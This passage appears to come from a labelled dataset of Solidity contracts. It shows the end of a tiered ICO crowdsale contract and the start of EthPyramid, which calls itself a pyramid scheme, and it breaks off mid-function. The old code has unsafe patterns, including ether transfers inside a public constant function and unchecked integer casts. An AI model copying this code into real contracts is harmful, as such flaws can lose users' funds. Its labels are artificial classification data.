ended\r\r\n   event Finalized();\r\r\n\r\r\n   \/\/\/ @notice Constructor of the crowsale to set up the main variables and create a token\r\r\n   \/\/\/ @param _wallet The wallet address that stores the Wei raised\r\r\n   \/\/\/ @param _tokenAddress The token used for the ICO\r\r\n   function Crowdsale(\r\r\n      address _wallet,\r\r\n      address _tokenAddress,\r\r\n      uint256 _startTime,\r\r\n      uint256 _endTime\r\r\n   ) {\r\r\n      require(_wallet != address(0));\r\r\n      require(_tokenAddress != address(0));\r\r\n\r\r\n      \/\/ If you send the start and end time on the constructor, the end must be larger\r\r\n      if(_startTime > 0 && _endTime > 0)\r\r\n         require(_startTime < _endTime);\r\r\n\r\r\n      wallet = _wallet;\r\r\n      token = PallyCoin(_tokenAddress);\r\r\n      vault = new RefundVault(_wallet);\r\r\n\r\r\n      if(_startTime > 0)\r\r\n         startTime = _startTime;\r\r\n\r\r\n      if(_endTime > 0)\r\r\n         endTime = _endTime;\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice Fallback function to buy tokens\r\r\n   function () payable {\r\r\n      buyTokens();\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice To buy tokens given an address\r\r\n   function buyTokens() public payable whenNotPaused {\r\r\n      require(validPurchase());\r\r\n\r\r\n      uint256 tokens = 0;\r\r\n      uint256 amountPaid = calculateExcessBalance();\r\r\n\r\r\n      if(tokensRaised < 12.5e24) {\r\r\n\r\r\n         \/\/ Tier 1\r\r\n         tokens = amountPaid.mul(rate);\r\r\n\r\r\n         \/\/ If the amount of tokens that you want to buy gets out of this tier\r\r\n         if(tokensRaised.add(tokens) > 12.5e24)\r\r\n            tokens = calculateExcessTokens(amountPaid, 12.5e24, 1, rate);\r\r\n      } else if(tokensRaised >= 12.5e24 && tokensRaised < 25e24) {\r\r\n\r\r\n         \/\/ Tier 2\r\r\n         tokens = amountPaid.mul(rateTier2);\r\r\n\r\r\n         \/\/ If the amount of tokens that you want to buy gets out of this tier\r\r\n         if(tokensRaised.add(tokens) > 25e24)\r\r\n            tokens = calculateExcessTokens(amountPaid, 25e24, 2, rateTier2);\r\r\n      } else if(tokensRaised >= 25e24 && tokensRaised < 37.5e24) {\r\r\n\r\r\n         \/\/ Tier 3\r\r\n         tokens = amountPaid.mul(rateTier3);\r\r\n\r\r\n         \/\/ If the amount of tokens that you want to buy gets out of this tier\r\r\n         if(tokensRaised.add(tokens) > 37.5e24)\r\r\n            tokens = calculateExcessTokens(amountPaid, 37.5e24, 3, rateTier3);\r\r\n      } else if(tokensRaised >= 37.5e24) {\r\r\n\r\r\n         \/\/ Tier 4\r\r\n         tokens = amountPaid.mul(rateTier4);\r\r\n      }\r\r\n\r\r\n      weiRaised = weiRaised.add(amountPaid);\r\r\n      tokensRaised = tokensRaised.add(tokens);\r\r\n      token.distributeICOTokens(msg.sender, tokens);\r\r\n\r\r\n      \/\/ Keep a record of how many tokens everybody gets in case we need to do refunds\r\r\n      tokensBought[msg.sender] = tokensBought[msg.sender].add(tokens);\r\r\n      TokenPurchase(msg.sender, amountPaid, tokens);\r\r\n\r\r\n      forwardFunds(amountPaid);\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice Sends the funds to the wallet or to the refund vault smart contract\r\r\n   \/\/\/ if the minimum goal of tokens hasn&#39;t been reached yet\r\r\n   \/\/\/ @param amountPaid The amount of ether paid\r\r\n   function forwardFunds(uint256 amountPaid) internal whenNotPaused {\r\r\n      if(goalReached()) {\r\r\n         wallet.transfer(amountPaid);\r\r\n      } else {\r\r\n         vault.deposit.value(amountPaid)(msg.sender);\r\r\n      }\r\r\n\r\r\n      \/\/ If the minimum goal of the ICO has been reach, close the vault to send\r\r\n      \/\/ the ether to the wallet of the crowdsale\r\r\n      checkCompletedCrowdsale();\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice Calculates how many ether will be used to generate the tokens in\r\r\n   \/\/\/ case the buyer sends more than the maximum balance but has some balance left\r\r\n   \/\/\/ and updates the balance of that buyer.\r\r\n   \/\/\/ For instance if he&#39;s 500 balance and he sends 1000, it will return 500\r\r\n   \/\/\/ and refund the other 500 ether\r\r\n   function calculateExcessBalance() internal whenNotPaused returns(uint256) {\r\r\n      uint256 amountPaid = msg.value;\r\r\n      uint256 differenceWei = 0;\r\r\n      uint256 exceedingBalance = 0;\r\r\n\r\r\n      \/\/ If we&#39;re in the last tier, check that the limit hasn&#39;t been reached\r\r\n      \/\/ and if so, refund the difference and return what will be used to\r\r\n      \/\/ buy the remaining tokens\r\r\n      if(tokensRaised >= 37.5e24) {\r\r\n         uint256 addedTokens = tokensRaised.add(amountPaid.mul(rateTier4));\r\r\n\r\r\n         \/\/ If tokensRaised + what you paid converted to tokens is bigger than the max\r\r\n         if(addedTokens > maxTokensRaised) {\r\r\n\r\r\n            \/\/ Refund the difference\r\r\n            uint256 difference = addedTokens.sub(maxTokensRaised);\r\r\n            differenceWei = difference.div(rateTier4);\r\r\n\r\r\n            amountPaid = amountPaid.sub(differenceWei);\r\r\n         }\r\r\n      }\r\r\n\r\r\n      uint256 addedBalance = crowdsaleBalances[msg.sender].add(amountPaid);\r\r\n\r\r\n      if(addedBalance <= maxPurchase) {\r\r\n         crowdsaleBalances[msg.sender] = crowdsaleBalances[msg.sender].add(amountPaid);\r\r\n      } else {\r\r\n\r\r\n         \/\/ Substracting 1000 ether in wei\r\r\n         exceedingBalance = addedBalance.sub(maxPurchase);\r\r\n         amountPaid = msg.value.sub(exceedingBalance);\r\r\n\r\r\n         \/\/ Add that balance to the balances\r\r\n         crowdsaleBalances[msg.sender] = crowdsaleBalances[msg.sender].add(amountPaid);\r\r\n      }\r\r\n\r\r\n      \/\/ Make the transfers at the end of the function for security purposes\r\r\n      if(differenceWei > 0)\r\r\n         msg.sender.transfer(differenceWei);\r\r\n\r\r\n      if(exceedingBalance > 0) {\r\r\n\r\r\n         \/\/ Return the exceeding balance to the buyer\r\r\n         msg.sender.transfer(exceedingBalance);\r\r\n      }\r\r\n\r\r\n      return amountPaid;\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice Set&#39;s the rate of tokens per ether for each tier. Use it after the\r\r\n   \/\/\/ smart contract is deployed to set the price according to the ether price\r\r\n   \/\/\/ at the start of the ICO\r\r\n   \/\/\/ @param tier1 The amount of tokens you get in the tier one\r\r\n   \/\/\/ @param tier2 The amount of tokens you get in the tier two\r\r\n   \/\/\/ @param tier3 The amount of tokens you get in the tier three\r\r\n   \/\/\/ @param tier4 The amount of tokens you get in the tier four\r\r\n   function setTierRates(uint256 tier1, uint256 tier2, uint256 tier3, uint256 tier4)\r\r\n      external onlyOwner whenNotPaused\r\r\n   {\r\r\n      require(tier1 > 0 && tier2 > 0 && tier3 > 0 && tier4 > 0);\r\r\n\r\r\n      rate = tier1;\r\r\n      rateTier2 = tier2;\r\r\n      rateTier3 = tier3;\r\r\n      rateTier4 = tier4;\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice Check if the crowdsale has ended and enables refunds only in case the\r\r\n   \/\/\/ goal hasn&#39;t been reached\r\r\n   function checkCompletedCrowdsale() public whenNotPaused {\r\r\n      if(!isEnded) {\r\r\n         if(hasEnded() && !goalReached()){\r\r\n            vault.enableRefunds();\r\r\n\r\r\n            isRefunding = true;\r\r\n            isEnded = true;\r\r\n            Finalized();\r\r\n         } else if(hasEnded() && goalReached()) {\r\r\n            vault.close();\r\r\n\r\r\n            isEnded = true;\r\r\n            Finalized();\r\r\n         }\r\r\n      }\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice If crowdsale is unsuccessful, investors can claim refunds here\r\r\n   function claimRefund() public whenNotPaused {\r\r\n     require(hasEnded() && !goalReached() && isRefunding);\r\r\n\r\r\n     vault.refund(msg.sender);\r\r\n     token.refundTokens(msg.sender, tokensBought[msg.sender]);\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice Buys the tokens for the specified tier and for the next one\r\r\n   \/\/\/ @param amount The amount of ether paid to buy the tokens\r\r\n   \/\/\/ @param tokensThisTier The limit of tokens of that tier\r\r\n   \/\/\/ @param tierSelected The tier selected\r\r\n   \/\/\/ @param _rate The rate used for that `tierSelected`\r\r\n   \/\/\/ @return uint The total amount of tokens bought combining the tier prices\r\r\n   function calculateExcessTokens(\r\r\n      uint256 amount,\r\r\n      uint256 tokensThisTier,\r\r\n      uint256 tierSelected,\r\r\n      uint256 _rate\r\r\n   ) public constant returns(uint256 totalTokens) {\r\r\n      require(amount > 0 && tokensThisTier > 0 && _rate > 0);\r\r\n      require(tierSelected >= 1 && tierSelected <= 4);\r\r\n\r\r\n      uint weiThisTier = tokensThisTier.sub(tokensRaised).div(_rate);\r\r\n      uint weiNextTier = amount.sub(weiThisTier);\r\r\n      uint tokensNextTier = 0;\r\r\n\r\r\n      \/\/ If there&#39;s excessive wei for the last tier, refund those\r\r\n      if(tierSelected != 4)\r\r\n         tokensNextTier = calculateTokensTier(weiNextTier, tierSelected.add(1));\r\r\n      else\r\r\n         msg.sender.transfer(weiNextTier);\r\r\n\r\r\n      totalTokens = tokensThisTier.sub(tokensRaised).add(tokensNextTier);\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice Buys the tokens given the price of the tier one and the wei paid\r\r\n   \/\/\/ @param weiPaid The amount of wei paid that will be used to buy tokens\r\r\n   \/\/\/ @param tierSelected The tier that you&#39;ll use for thir purchase\r\r\n   \/\/\/ @return calculatedTokens Returns how many tokens you&#39;ve bought for that wei paid\r\r\n   function calculateTokensTier(uint256 weiPaid, uint256 tierSelected)\r\r\n        internal constant returns(uint256 calculatedTokens)\r\r\n   {\r\r\n      require(weiPaid > 0);\r\r\n      require(tierSelected >= 1 && tierSelected <= 4);\r\r\n\r\r\n      if(tierSelected == 1)\r\r\n         calculatedTokens = weiPaid.mul(rate);\r\r\n      else if(tierSelected == 2)\r\r\n         calculatedTokens = weiPaid.mul(rateTier2);\r\r\n      else if(tierSelected == 3)\r\r\n         calculatedTokens = weiPaid.mul(rateTier3);\r\r\n      else\r\r\n         calculatedTokens = weiPaid.mul(rateTier4);\r\r\n   }\r\r\n\r\r\n\r\r\n   \/\/\/ @notice Checks if a purchase is considered valid\r\r\n   \/\/\/ @return bool If the purchase is valid or not\r\r\n   function validPurchase() internal constant returns(bool) {\r\r\n      bool withinPeriod = now >= startTime && now <= endTime;\r\r\n      bool nonZeroPurchase = msg.value > 0;\r\r\n      bool withinTokenLimit = tokensRaised < maxTokensRaised;\r\r\n      bool minimumPurchase = msg.value >= minPurchase;\r\r\n      bool hasBalanceAvailable = crowdsaleBalances[msg.sender] < maxPurchase;\r\r\n\r\r\n      return withinPeriod && nonZeroPurchase && withinTokenLimit && minimumPurchase && hasBalanceAvailable;\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice To see if the minimum goal of tokens of the ICO has been reached\r\r\n   \/\/\/ @return bool True if the tokens raised are bigger than the goal or false otherwise\r\r\n   function goalReached() public constant returns(bool) {\r\r\n      return tokensRaised >= minimumGoal;\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice Public function to check if the crowdsale has ended or not\r\r\n   function hasEnded() public constant returns(bool) {\r\r\n      return now > endTime || tokensRaised >= maxTokensRaised;\r\r\n   }\r\r\n}","label":0}
{"code":"\/**\r\r\n\r\r\n *Submitted for verification at Etherscan.io on 2018-02-02\r\r\n\r\r\n*\/\r\r\n\r\r\n\r\r\n\r\r\npragma solidity ^0.4.18;\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n\r\r\n          ,\/`.\r\r\n\r\r\n        ,'\/ __`.\r\r\n\r\r\n      ,'_\/_  _ _`.\r\r\n\r\r\n    ,'__\/_ ___ _  `.\r\r\n\r\r\n  ,'_  \/___ __ _ __ `.\r\r\n\r\r\n '-.._\/___...-\"-.-..__`.\r\r\n\r\r\n  B\r\r\n\r\r\n\r\r\n\r\r\n EthPyramid. A no-bullshit, transparent, self-sustaining pyramid scheme.\r\r\n\r\r\n \r\r\n\r\r\n Inspired by https:\/\/test.jochen-hoenicke.de\/eth\/ponzitoken\/\r\r\n\r\r\n\r\r\n\r\r\n Developers:\r\r\n\r\r\n\tArc\r\r\n\r\r\n\tDivine\r\r\n\r\r\n\tNorsefire\r\r\n\r\r\n\tToCsIcK\r\r\n\r\r\n\t\r\r\n\r\r\n Front-End:\r\r\n\r\r\n\tCardioth\r\r\n\r\r\n\ttenmei\r\r\n\r\r\n\tTrendium\r\r\n\r\r\n\t\r\r\n\r\r\n Moral Support:\r\r\n\r\r\n\tDeadCow.Rat\r\r\n\r\r\n\tDots\r\r\n\r\r\n\tFatKreamy\r\r\n\r\r\n\tKaseylol\r\r\n\r\r\n\tQuantumDeath666\r\r\n\r\r\n\tQuentin\r\r\n\r\r\n \r\r\n\r\r\n Shit-Tier:\r\r\n\r\r\n\tHentaiChrist\r\r\n\r\r\n \r\r\n\r\r\n*\/\r\r\n\r\r\n\r\r\n\r\r\ncontract EthPyramid {\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ scaleFactor is used to convert Ether into tokens and vice-versa: they're of different\r\r\n\r\r\n\t\/\/ orders of magnitude, hence the need to bridge between the two.\r\r\n\r\r\n\tuint256 constant scaleFactor = 0x10000000000000000;  \/\/ 2^64\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ CRR = 50%\r\r\n\r\r\n\t\/\/ CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).\r\r\n\r\r\n\t\/\/ For more on this: check out https:\/\/en.wikipedia.org\/wiki\/Reserve_requirement\r\r\n\r\r\n\tint constant crr_n = 1; \/\/ CRR numerator\r\r\n\r\r\n\tint constant crr_d = 2; \/\/ CRR denominator\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ The price coefficient. Chosen such that at 1 token total supply\r\r\n\r\r\n\t\/\/ the amount in reserve is 0.5 ether and token price is 1 Ether.\r\r\n\r\r\n\tint constant price_coeff = -0x296ABF784A358468C;\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Typical values that we have to declare.\r\r\n\r\r\n\tstring constant public name = \"EthPyramid\";\r\r\n\r\r\n\tstring constant public symbol = \"EPY\";\r\r\n\r\r\n\tuint8 constant public decimals = 18;\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Array between each address and their number of tokens.\r\r\n\r\r\n\tmapping(address => uint256) public tokenBalance;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\/\/ Array between each address and how much Ether has been paid out to it.\r\r\n\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\r\r\n\tmapping(address => int256) public payouts;\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Variable tracking how many tokens are in existence overall.\r\r\n\r\r\n\tuint256 public totalSupply;\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Aggregate sum of all payouts.\r\r\n\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\r\r\n\tint256 totalPayouts;\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Variable tracking how much Ether each token is currently worth.\r\r\n\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\r\r\n\tuint256 earningsPerToken;\r\r\n\r\r\n\t\r\r\n\r\r\n\t\/\/ Current contract balance in Ether\r\r\n\r\r\n\tuint256 public contractBalance;\r\r\n\r\r\n\r\r\n\r\r\n\tfunction EthPyramid() public {}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ The following functions are used by the front-end for display purposes.\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Returns the number of tokens currently held by _owner.\r\r\n\r\r\n\tfunction balanceOf(address _owner) public constant returns (uint256 balance) {\r\r\n\r\r\n\t\treturn tokenBalance[_owner];\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Withdraws all dividends held by the caller sending the transaction, updates\r\r\n\r\r\n\t\/\/ the requisite global variables, and transfers Ether back to the caller.\r\r\n\r\r\n\tfunction withdraw() public {\r\r\n\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Increase the total amount that's been paid out to maintain invariance.\r\r\n\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Send the dividends to the address that requested the withdraw.\r\r\n\r\r\n\t\tcontractBalance = sub(contractBalance, balance);\r\r\n\r\r\n\t\tmsg.sender.transfer(balance);\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Converts the Ether accrued as dividends back into EPY tokens without having to\r\r\n\r\r\n\t\/\/ withdraw it first. Saves on gas and potential price spike loss.\r\r\n\r\r\n\tfunction reinvestDividends() public {\r\r\n\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\r\r\n\t\t\/\/ Since this is essentially a shortcut to withdrawing and reinvesting, this step still holds.\r\r\n\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Increase the total amount that's been paid out to maintain invariance.\r\r\n\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Assign balance to a new variable.\r\r\n\r\r\n\t\tuint value_ = (uint) (balance);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ If your dividends are worth less than 1 szabo, or more than a million Ether\r\r\n\r\r\n\t\t\/\/ (in which case, why are you even here), abort.\r\r\n\r\r\n\t\tif (value_ < 0.000001 ether || value_ > 1000000 ether)\r\r\n\r\r\n\t\t\trevert();\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\/\/ msg.sender is the address of the caller.\r\r\n\r\r\n\t\tvar sender = msg.sender;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ A temporary reserve variable used for calculating the reward the holder gets for buying tokens.\r\r\n\r\r\n\t\t\/\/ (Yes, the buyer receives a part of the distribution as well!)\r\r\n\r\r\n\t\tvar res = reserve() - balance;\r\r\n\r\r\n\r\r\n\r\r\n\t\t\/\/ 10% of the total Ether sent is used to pay existing holders.\r\r\n\r\r\n\t\tvar fee = div(value_, 10);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ The amount of Ether used to purchase new tokens for the caller.\r\r\n\r\r\n\t\tvar numEther = value_ - fee;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ The number of tokens which can be purchased for numEther.\r\r\n\r\r\n\t\tvar numTokens = calculateDividendTokens(numEther, balance);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ The buyer fee, scaled by the scaleFactor variable.\r\r\n\r\r\n\t\tvar buyerFee = fee * scaleFactor;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Check that we have tokens in existence (this should always be true), or\r\r\n\r\r\n\t\t\/\/ else you're gonna have a bad time.\r\r\n\r\r\n\t\tif (totalSupply > 0) {\r\r\n\r\r\n\t\t\t\/\/ Compute the bonus co-efficient for all existing holders and the buyer.\r\r\n\r\r\n\t\t\t\/\/ The buyer receives part of the distribution for each token bought in the\r\r\n\r\r\n\t\t\t\/\/ same way they would have if they bought each token individually.\r\r\n\r\r\n\t\t\tvar bonusCoEff =\r\r\n\r\r\n\t\t\t    (scaleFactor - (res + numEther) * numTokens * scaleFactor \/ (totalSupply + numTokens) \/ numEther)\r\r\n\r\r\n\t\t\t    * (uint)(crr_d) \/ (uint)(crr_d-crr_n);\r\r\n\r\r\n\t\t\t\t\r\r\n\r\r\n\t\t\t\/\/ The total reward to be distributed amongst the masses is the fee (in Ether)\r\r\n\r\r\n\t\t\t\/\/ multiplied by the bonus co-efficient.\r\r\n\r\r\n\t\t\tvar holderReward = fee * bonusCoEff;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\tbuyerFee -= holderReward;\r\r\n\r\r\n\r\r\n\r\r\n\t\t\t\/\/ Fee is distributed to all existing token holders before the new tokens are purchased.\r\r\n\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this buy-in.\r\r\n\r\r\n\t\t\tvar rewardPerShare = holderReward \/ totalSupply;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\r\r\n\t\t\tearningsPerToken += rewardPerShare;\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Add the numTokens which were just created to the total supply. We're a crypto central bank!\r\r\n\r\r\n\t\ttotalSupply = add(totalSupply, numTokens);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Assign the tokens to the balance of the buyer.\r\r\n\r\r\n\t\ttokenBalance[sender] = add(tokenBalance[sender], numTokens);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Update the payout array so that the buyer cannot claim dividends on previous purchases.\r\r\n\r\r\n\t\t\/\/ Also include the fee paid for entering the scheme.\r\r\n\r\r\n\t\t\/\/ First we compute how much was just paid out to the buyer...\r\r\n\r\r\n\t\tvar payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Then we update the payouts array for the buyer with this amount...\r\r\n\r\r\n\t\tpayouts[sender] += payoutDiff;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ And then we finally add it to the variable tracking the total amount spent to maintain invariance.\r\r\n\r\r\n\t\ttotalPayouts    += payoutDiff;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Sells your tokens for Ether. This Ether is assigned to the callers entry\r\r\n\r\r\n\t\/\/ in the tokenBalance array, and therefore is shown as a dividend. A second\r\r\n\r\r\n\t\/\/ call to withdraw() must be made to invoke the transfer of Ether back to your address.\r\r\n\r\r\n\tfunction sellMyTokens() public {\r\r\n\r\r\n\t\tvar balance = balanceOf(msg.sender);\r\r\n\r\r\n\t\tsell(balance);\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ The slam-the-button escape hatch. Sells the callers tokens for Ether, then immediately\r\r\n\r\r\n\t\/\/ invokes the withdraw() function, sending the resulting Ether to the callers address.\r\r\n\r\r\n    function getMeOutOfHere() public {\r\r\n\r\r\n\t\tsellMyTokens();\r\r\n\r\r\n        withdraw();\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Gatekeeper function to check if the amount of Ether being sent isn't either\r\r\n\r\r\n\t\/\/ too small or too large. If it passes, goes direct to buy().\r\r\n\r\r\n\tfunction fund() payable public {\r\r\n\r\r\n\t\t\/\/ Don't allow for funding if the amount of Ether sent is less than 1 szabo.\r\r\n\r\r\n\t\tif (msg.value > 0.000001 ether) {\r\r\n\r\r\n\t\t    contractBalance = add(contractBalance, msg.value);\r\r\n\r\r\n\t\t\tbuy();\r\r\n\r\r\n\t\t} else {\r\r\n\r\r\n\t\t\trevert();\r\r\n\r\r\n\t\t}\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Function that returns the (dynamic) price of buying a finney worth of tokens.\r\r\n\r\r\n\tfunction buyPrice() public constant returns (uint) {\r\r\n\r\r\n\t\treturn getTokensForEther(1 finney);\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Function that returns the (dynamic) price of selling a single token.\r\r\n\r\r\n\tfunction sellPrice() public constant returns (uint) {\r\r\n\r\r\n        var eth = getEtherForTokens(1 finney);\r\r\n\r\r\n        var fee = div(eth, 10);\r\r\n\r\r\n        return eth - fee;\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Calculate the current dividends associated with the caller address. This is the net result\r\r\n\r\r\n\t\/\/ of multiplying the number of tokens held by their current value in Ether and subtracting the\r\r\n\r\r\n\t\/\/ Ether that has already been paid out.\r\r\n\r\r\n\tfunction dividends(address _owner) public constant returns (uint256 amount) {\r\r\n\r\r\n\t\treturn (uint256) ((int256)(earningsPerToken * tokenBalance[_owner]) - payouts[_owner]) \/ scaleFactor;\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Version of withdraw that extracts the dividends and sends the Ether to the caller.\r\r\n\r\r\n\t\/\/ This is only used in the case when there is no transaction data, and that should be\r\r\n\r\r\n\t\/\/ quite rare unless interacting directly with the smart contract.\r\r\n\r\r\n\tfunction withdrawOld(address to) public {\r\r\n\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Increase the total amount that's been paid out to maintain invariance.\r\r\n\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Send the dividends to the address that requested the withdraw.\r\r\n\r\r\n\t\tcontractBalance = sub(contractBalance, balance);\r\r\n\r\r\n\t\tto.transfer(balance);\t\t\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Internal balance function, used to calculate the dynamic reserve value.\r\r\n\r\r\n\tfunction balance() internal constant returns (uint256 amount) {\r\r\n\r\r\n\t\t\/\/ msg.value is the amount of Ether sent by the transaction.\r\r\n\r\r\n\t\treturn contractBalance - msg.value;\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\tfunction buy() internal {\r\r\n\r\r\n\t\t\/\/ Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.\r\r\n\r\r\n\t\tif (msg.value < 0.000001 ether || msg.value > 1000000 ether)\r\r\n\r\r\n\t\t\trevert();\r\r\n\r\r\n\t\t\t\t\t\t\r\r\n\r\r\n\t\t\/\/ msg.sender is the address of the caller.\r\r\n\r\r\n\t\tvar sender = msg.sender;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ 10% of the total Ether sent is used to pay existing holders.\r\r\n\r\r\n\t\tvar fee = div(msg.value, 10);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ The amount of Ether used to purchase new tokens for the caller.\r\r\n\r\r\n\t\tvar numEther = msg.value - fee;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ The number of tokens which can be purchased for numEther.\r\r\n\r\r\n\t\tvar numTokens = getTokensForEther(numEther);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ The buyer fee, scaled by the scaleFactor variable.\r\r\n\r\r\n\t\tvar buyerFee = fee * scaleFactor;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Check that we have tokens in existence (this should always be true), or\r\r\n\r\r\n\t\t\/\/ else you're gonna have a bad time.\r\r\n\r\r\n\t\tif (totalSupply > 0) {\r\r\n\r\r\n\t\t\t\/\/ Compute the bonus co-efficient for all existing holders and the buyer.\r\r\n\r\r\n\t\t\t\/\/ The buyer receives part of the distribution for each token bought in the\r\r\n\r\r\n\t\t\t\/\/ same way they would have if they bought each token individually.\r\r\n\r\r\n\t\t\tvar bonusCoEff =\r\r\n\r\r\n\t\t\t    (scaleFactor - (reserve() + numEther) * numTokens * scaleFactor \/ (totalSupply + numTokens) \/ numEther)\r\r\n\r\r\n\t\t\t    * (uint)(crr_d) \/ (uint)(crr_d-crr_n);\r\r\n\r\r\n\t\t\t\t\r\r\n\r\r\n\t\t\t\/\/ The total reward to be distributed amongst the masses is the fee (in Ether)\r\r\n\r\r\n\t\t\t\/\/ multiplied by the bonus co-efficient.\r\r\n\r\r\n\t\t\tvar holderReward = fee * bonusCoEff;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\tbuyerFee -= holderReward;\r\r\n\r\r\n\r\r\n\r\r\n\t\t\t\/\/ Fee is distributed to all existing token holders before the new tokens are purchased.\r\r\n\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this buy-in.\r\r\n\r\r\n\t\t\tvar rewardPerShare = holderReward \/ totalSupply;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\r\r\n\t\t\tearningsPerToken += rewardPerShare;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\t\/\/ Add the numTokens which were just created to the total supply. We're a crypto central bank!\r\r\n\r\r\n\t\ttotalSupply = add(totalSupply, numTokens);\r\r\n\r\r\n\r\r\n\r\r\n\t\t\/\/ Assign the tokens to the balance of the buyer.\r\r\n\r\r\n\t\ttokenBalance[sender] = add(tokenBalance[sender], numTokens);\r\r\n\r\r\n\r\r\n\r\r\n\t\t\/\/ Update the payout array so that the buyer cannot claim dividends on previous purchases.\r\r\n\r\r\n\t\t\/\/ Also include the fee paid for entering the scheme.\r\r\n\r\r\n\t\t\/\/ First we compute how much was just paid out to the buyer...\r\r\n\r\r\n\t\tvar 